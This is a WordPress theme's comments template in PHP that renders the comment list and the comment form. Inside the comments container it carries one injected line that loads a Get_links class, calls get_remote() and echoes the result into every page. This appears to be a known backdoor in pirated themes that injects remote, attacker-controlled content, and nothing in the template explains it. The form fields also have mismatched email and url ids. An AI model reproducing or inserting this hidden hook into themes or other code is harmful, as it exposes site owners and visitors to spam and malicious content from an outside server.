<?php
/**
 * The template for displaying comments.
 *
 * The area of the page that contains both current comments
 * and the comment form.
 *
 * @package Seasonal
 */

/*
 * If the current post is protected by a password and
 * the visitor has not yet entered the password we will
 * return early without loading the comments.
 */
if ( post_password_required() ) {
	return;
}
?>

<div class="comment-container" id="comments">
    <?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?>        
    <h3 class="comments-number"><?php comments_number( __('No Comments','seasonal'), '1'.__(' Comment ','seasonal'), '% '.__(' Comments ','seasonal')); ?></h3>            
    <?php if ( post_password_required() ) : ?>
    <p class="nopassword"><?php _e( 'This post is password protected. Enter the password to view any comments.', 'seasonal' ); ?></p>   
</div>

<?php	
	return;
	endif;
?>

<?php if ( have_comments() ) : ?>
	<ul class="comment-list">
		<?php wp_list_comments(array( 'callback' => 'seasonal_comment')); ?>
	</ul>
	<?php // End Comments ?>

 	<?php else : // this is displayed if there are no comments so far 

	if ( ! comments_open() ) :
?>
		<!-- If comments are open, but there are no comments. -->	 
		<!-- If comments are closed. -->
        
		<p><?php _e('Sorry, the comment form is closed at this time.', 'seasonal'); ?></p>

	<?php endif; ?>
<?php endif; ?>


<?php
$commenter = wp_get_current_commenter();
$req = get_option( 'require_name_email' );
$aria_req = ( $req ? " aria-required='true'" : '' );

$args = array(
	'id_submit' => 'submit-comment',
	'title_reply'=>'<h4>'. __( 'Post a Comment','seasonal' ) .'</h4>',
	'title_reply_to' => __( 'Post a Reply to %s','seasonal' ),
	'cancel_reply_link' => __( 'Cancel Reply','seasonal' ),
	'label_submit' => __( 'Submit','seasonal' ),
	'comment_field' => '<textarea id="comment" placeholder="'.__( 'Write your comment here...','seasonal' ).'" name="comment" cols="45" rows="8" aria-required="true"></textarea>',
	'comment_notes_before' => '',
	'comment_notes_after' => '',
	'fields' => apply_filters( 'comment_form_default_fields', array(
		'author' => '<input id="author" name="author" placeholder="'. __( 'Your full name','seasonal' ) .'" type="text" value="' . esc_attr( $commenter['comment_author'] ) . '"' . $aria_req . ' />',
		'url' => '<input id="email" name="email" placeholder="'. __( 'E-mail address','seasonal' ) .'" type="text" value="' . esc_attr(  $commenter['comment_author_email'] ) . '"' . $aria_req . ' />',
		'email' => '<input id="url" name="url" type="text" placeholder="'. __( 'Website','seasonal' ) .'" value="' . esc_attr( $commenter['comment_author_url'] ) . '" />'
		 ) ) );
 ?>
 
 <div class="comment_pager">
	<p><?php paginate_comments_links(); ?></p>
 </div>
 
 <div class="comment_form">
	<?php comment_form($args); ?>
</div>
						
	